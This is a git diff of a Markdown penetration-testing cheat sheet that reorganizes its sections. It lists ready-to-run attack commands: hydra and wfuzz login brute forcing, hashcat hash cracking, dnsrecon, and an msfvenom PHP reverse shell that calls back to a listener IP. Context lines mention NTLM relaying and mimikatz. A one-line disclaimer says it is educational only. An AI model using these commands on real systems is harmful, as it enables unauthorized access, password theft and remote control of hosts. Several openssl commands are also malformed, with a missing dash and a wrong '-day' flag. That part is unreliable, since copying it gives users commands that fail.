@@ -1,25 +1,28 @@
 # Table of contents
 
 1. [Misc](#Misc)
-2. [Active Directory Initial Attack Vectors](#Active-Directory-Initial-Attack-Vectors)
-3. [Active Directory Enumeration](#active-directory-enumeration)
-4. [Active Directory Post-Compromise Attacks](#active-directory-post-compromise-attacks)
-5. [Web Application Enumeration](#web-application-enumeration)
-6. [XML External Entities (XXE)](#xml-external-entities-(xxe))
-7. [Cross Site Scripting (XSS)](#cross-site-scripting-(xss))
-8. [Wifi Hacking](#wifi-hacking)
-9. [Windows Privilege Escalation](#windows-privilege-escalation)
-10. [Linux Privilege Escalation](#linux-privilege-escalation)
-11. [SMTP](#smtp)
-12. [SSH](#ssh)
-13. [Word Press](#word-press)
-14. [RSA](#rsa)
+2. [Port Scanning](#port-scanning)
+3. [Brute Forcing](#brute-forcing)
+4. [Cracking](#cracking)
+5. [Active Directory Initial Attack Vectors](#Active-Directory-Initial-Attack-Vectors)
+6. [Active Directory Enumeration](#active-directory-enumeration)
+7. [Active Directory Post-Compromise Attacks](#active-directory-post-compromise-attacks)
+8. [Web Application Enumeration](#web-application-enumeration)
+9. [XML External Entities (XXE)](#xml-external-entities-(xxe))
+10. [Cross Site Scripting (XSS)](#cross-site-scripting-(xss))
+11. [Wifi Hacking](#wifi-hacking)
+12. [Windows Privilege Escalation](#windows-privilege-escalation)
+13. [Linux Privilege Escalation](#linux-privilege-escalation)
+14. [SMTP](#smtp)
+15. [DNS](#dns)
+16. [SSH](#ssh)
+17. [Word Press](#word-press)
+18. [PHP](#php)
+19. [RSA](#rsa)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
 # Misc
-
----
 
 ## Fix VPN routing issue (same subnet)
 
@@ -49,7 +52,11 @@ python3 -m http.server 8080
 sudo -u scriptmanager bash -i
 ```
 
-## Portscanning
+## Password List
+
+:information_source: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+
+# Port Scanning
 
 ``` bash
 nmap -sC -sV -oA outfile 192.168.1.0/24
@@ -59,8 +66,21 @@ nmap -sC -sV -oA outfile 192.168.1.0/24
 for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done
 ```
 
+# Brute Forcing
+## hydra
 
+```bash
+hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
+```
 
+Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
+## wfuzz
+
+``` bash
+wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
+```
+
+# Cracking
 ## Crack MD5 Hash
 
 ```bash
@@ -71,68 +91,7 @@ hashcat -m 500 hash rockyou.txt
 hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
 ```
 
-## Password List
-
-:information_source: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
-
-## Web Enumeration
-
-```bash
-gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
-```
-
-## DNS Recon
-
-``` bash
-dnsrecon -r 127.0.0.1/24 -n <IP of DNS Server>
-```
-
-## PHP Reverse Shell
-
-```bash
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
-```
-
-## Brute Forcing
-### hydra
-
-```bash
-hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
-```
-
-Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
-### wfuzz
-
-``` bash
-wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
-```
-
-## SSL
-### Check if Private Key matches Certificate
-
-```bash
-openssl x509 -noout in serct.crt | md5sum
-```
-
-```bash
-openssl rsa -noout in key.key | md5sum	
-```
-
-### Generate new Private Key and Certificate Signing Request (CSR)
-
-```bash
-openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout key.key
-```
-
-### Generate a self-signed Certificate
-
-```bash
-openssl req -x509 -sha256 -nodes -day 365 -newkey rsa:2048 -keyout key.key -out crt.crt
-```
-
 # Active Directory Initial Attack Vectors
-
----
 
 ## Capturing NTLM net-Hashes with Responder
 
@@ -221,8 +180,6 @@ ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfi
 :information_source: ``` --delegate-access ``` 
 
 # Active Directory Enumeration
-
------
 
 ## PowerView
 
@@ -331,7 +288,6 @@ Transfer the zip file to kali instance and load it into bloodhound to visualize.
 :information_source: bloodhound depends on neo4j
 
 # Active Directory Post-Compromise Attacks
----
 
 ## Pass The Password
 
@@ -448,7 +404,9 @@ mimikatz # misc::cmd
 
 # Web Application Enumeration
 
----
+```bash
+gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
+```
 
 Install golang and add the following two lines to ~/.bashrc (or ~/.profiles)
 
@@ -479,8 +437,6 @@ go get -u github.com/sensepost/gowitness
 
 # XML External Entities (XXE)
 
----
-
 Basic idea: upload an xml to test if it gets parsed and then abusing the doctype definition (DTD).
 
 ```xml
@@ -492,8 +448,6 @@ Basic idea: upload an xml to test if it gets parsed and then abusing the doctype
 
 # Cross Site Scripting (XSS)
 
----
-
 :information_source: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)
 
 :information_source: https://www.scip.ch/en/?labs.20171214 
@@ -501,8 +455,6 @@ Basic idea: upload an xml to test if it gets parsed and then abusing the doctype
 :information_source: https://xss-game.appspot.com/
 
 # Wifi Hacking
-
----
 
 ## WPS Pin Recovery
 ```bash
@@ -645,6 +597,14 @@ a3 EXAMINE INBOX
 a4 FETCH 1 BODY[]
 a5 FETCH 2 BODY[]
 ```
+
+# DNS
+## DNS Recon
+
+``` bash
+dnsrecon -r 127.0.0.1/24 -n <IP of DNS Server>
+```
+
 # SSH
 ## Crack Passphrase for given SSH-Key
 * [John The Ripper](https://github.com/openwall/john)
@@ -658,6 +618,13 @@ john id_rsa.hash --wordlist=<wordlist>
 ## wpscan
 ```
 wpscan --url https://brainfuck.htb --disable-tls-checks
+```
+
+# PHP
+## PHP Reverse Shell
+
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
 ```
 
 # RSA
@@ -701,5 +668,27 @@ if __name__ == "__main__":
     main()
 ```
 
+# SSL
+## Check if Private Key matches Certificate
+
+```bash
+openssl x509 -noout in serct.crt | md5sum
+```
+
+```bash
+openssl rsa -noout in key.key | md5sum	
+```
+
+## Generate new Private Key and Certificate Signing Request (CSR)
+
+```bash
+openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout key.key
+```
+
+## Generate a self-signed Certificate
+
+```bash
+openssl req -x509 -sha256 -nodes -day 365 -newkey rsa:2048 -keyout key.key -out crt.crt
+```
 
 
